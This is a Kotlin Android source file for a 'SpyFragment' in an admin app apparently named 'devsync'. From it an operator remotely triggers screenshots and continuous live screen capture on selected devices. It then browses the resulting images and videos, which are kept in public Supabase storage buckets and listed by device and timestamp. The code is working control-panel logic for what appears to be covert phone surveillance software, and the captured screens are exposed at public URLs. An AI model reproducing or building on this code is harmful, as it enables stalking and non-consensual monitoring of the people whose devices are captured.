package com.example.devsync

  import android.graphics.Color
  import android.os.Bundle
  import android.view.View
  import android.widget.Button
  import android.widget.Switch
  import android.widget.TextView
  import androidx.fragment.app.Fragment
  import androidx.recyclerview.widget.LinearLayoutManager
  import androidx.recyclerview.widget.RecyclerView
  import androidx.swiperefreshlayout.widget.SwipeRefreshLayout
  import kotlinx.coroutines.*

  class SpyFragment : Fragment(R.layout.fragment_spy) {

      private val admin get() = requireActivity() as AdminControlActivity

      private lateinit var swipeSpy: SwipeRefreshLayout
      private lateinit var rvScreenshots: RecyclerView
      private lateinit var rvLiveVideos: RecyclerView
      private lateinit var btnTabScreenshots: Button
      private lateinit var btnTabLiveVideos: Button

      private val screenshotList = mutableListOf<ScreenshotItem>()
      private val liveVideoList  = mutableListOf<ScreenshotItem>()

      private lateinit var screenshotAdapter: ScreenshotListAdapter
      private lateinit var liveVideoAdapter: VideoListAdapter

      private var showingScreenshots = true

      override fun onViewCreated(view: View, savedInstanceState: Bundle?) {
          super.onViewCreated(view, savedInstanceState)

          swipeSpy         = view.findViewById(R.id.swipeSpy)
          rvScreenshots    = view.findViewById(R.id.rvScreenshots)
          rvLiveVideos     = view.findViewById(R.id.rvLiveVideos)
          btnTabScreenshots= view.findViewById(R.id.btnTabScreenshots)
          btnTabLiveVideos = view.findViewById(R.id.btnTabLiveVideos)

          screenshotAdapter = ScreenshotListAdapter(screenshotList)
          liveVideoAdapter  = VideoListAdapter(liveVideoList)

          rvScreenshots.layoutManager = LinearLayoutManager(requireContext())
          rvScreenshots.adapter = screenshotAdapter

          rvLiveVideos.layoutManager = LinearLayoutManager(requireContext())
          rvLiveVideos.adapter = liveVideoAdapter

          // Tab switching
          btnTabScreenshots.setOnClickListener { switchTab(screenshots = true) }
          btnTabLiveVideos.setOnClickListener  { switchTab(screenshots = false) }

          // Live capture toggle
          val switchLive = view.findViewById<Switch>(R.id.switchLiveCapture)
          val tvStatus   = view.findViewById<TextView>(R.id.tvLiveCaptureStatus)
          switchLive.setOnCheckedChangeListener { _, on ->
              admin.sendToSelected { d -> d.child("live_capture_enabled").setValue(on) }
              tvStatus.text = if (on) "● Live: ON — 2fps → video" else "● Stopped"
              tvStatus.setTextColor(if (on) 0xFF00FF88.toInt() else 0xFF8B949E.toInt())
          }

          // Take screenshot
          view.findViewById<Button>(R.id.btnTakeScreenshot).setOnClickListener {
              admin.sendToSelected { d -> d.child("take_screenshot").setValue(true) }
          }

          // Refresh button
          view.findViewById<Button>(R.id.btnRefreshScreenshots).setOnClickListener {
              swipeSpy.isRefreshing = true
              reloadActive { swipeSpy.isRefreshing = false }
          }

          // Pull-to-refresh
          swipeSpy.setOnRefreshListener {
              reloadActive { swipeSpy.isRefreshing = false }
          }

          loadScreenshots(null)
          loadLiveVideos(null)
      }

      override fun onResume() {
          super.onResume()
          if (showingScreenshots) loadScreenshots(null) else loadLiveVideos(null)
      }

      private fun switchTab(screenshots: Boolean) {
          showingScreenshots = screenshots
          rvScreenshots.visibility = if (screenshots) View.VISIBLE else View.GONE
          rvLiveVideos.visibility  = if (screenshots) View.GONE   else View.VISIBLE

          btnTabScreenshots.setTextColor(if (screenshots) Color.WHITE else Color.parseColor("#8B949E"))
          btnTabLiveVideos.setTextColor(if (screenshots) Color.parseColor("#8B949E") else Color.WHITE)
          btnTabScreenshots.backgroundTintList = android.content.res.ColorStateList.valueOf(
              if (screenshots) Color.parseColor("#21262D") else Color.parseColor("#0D1117"))
          btnTabLiveVideos.backgroundTintList = android.content.res.ColorStateList.valueOf(
              if (screenshots) Color.parseColor("#0D1117") else Color.parseColor("#21262D"))

          if (screenshots) loadScreenshots(null) else loadLiveVideos(null)
      }

      private fun reloadActive(onDone: () -> Unit) {
          if (showingScreenshots) loadScreenshots(onDone) else loadLiveVideos(onDone)
      }

      private fun loadScreenshots(onDone: (() -> Unit)?) {
          CoroutineScope(Dispatchers.IO).launch {
              val arr = admin.supabaseList("screenshots")
              val list = mutableListOf<ScreenshotItem>()
              for (i in 0 until arr.length()) {
                  try {
                      val obj  = arr.getJSONObject(i)
                      val name = obj.optString("name")
                      if (!name.endsWith(".jpg") && !name.endsWith(".jpeg")) continue
                      val noExt     = name.removeSuffix(".jpg").removeSuffix(".jpeg")
                      val lastUnder = noExt.lastIndexOf('_')
                      val ts  = if (lastUnder >= 0) noExt.substring(lastUnder + 1).toLongOrNull() ?: 0L else 0L
                      val did = if (lastUnder >= 0) noExt.substring(0, lastUnder) else noExt
                      val url = "${AdminControlActivity.SUPABASE_URL}/storage/v1/object/public/screenshots/$name"
                      list.add(ScreenshotItem(name, did, url, ts))
                  } catch (_: Exception) {}
              }
              list.sortByDescending { it.timestamp }
              withContext(Dispatchers.Main) {
                  screenshotList.clear(); screenshotList.addAll(list)
                  screenshotAdapter.notifyDataSetChanged()
                  onDone?.invoke()
              }
          }
      }

      private fun loadLiveVideos(onDone: (() -> Unit)?) {
          CoroutineScope(Dispatchers.IO).launch {
              val arr = admin.supabaseList("videos")
              val list = mutableListOf<ScreenshotItem>()
              for (i in 0 until arr.length()) {
                  try {
                      val obj  = arr.getJSONObject(i)
                      val name = obj.optString("name")
                      // Live capture videos have "vid_" prefix (from ScreenshotService)
                      if (!name.startsWith("vid_") || !name.endsWith(".mp4")) continue
                      val noExt     = name.removeSuffix(".mp4")
                      val parts     = noExt.split("_")
                      val ts        = parts.lastOrNull()?.toLongOrNull() ?: 0L
                      val did       = parts.getOrElse(1) { "" }
                      val url = "${AdminControlActivity.SUPABASE_URL}/storage/v1/object/public/videos/$name"
                      list.add(ScreenshotItem(name, did, url, ts))
                  } catch (_: Exception) {}
              }
              list.sortByDescending { it.timestamp }
              withContext(Dispatchers.Main) {
                  liveVideoList.clear(); liveVideoList.addAll(list)
                  liveVideoAdapter.notifyDataSetChanged()
                  onDone?.invoke()
              }
          }
      }
  }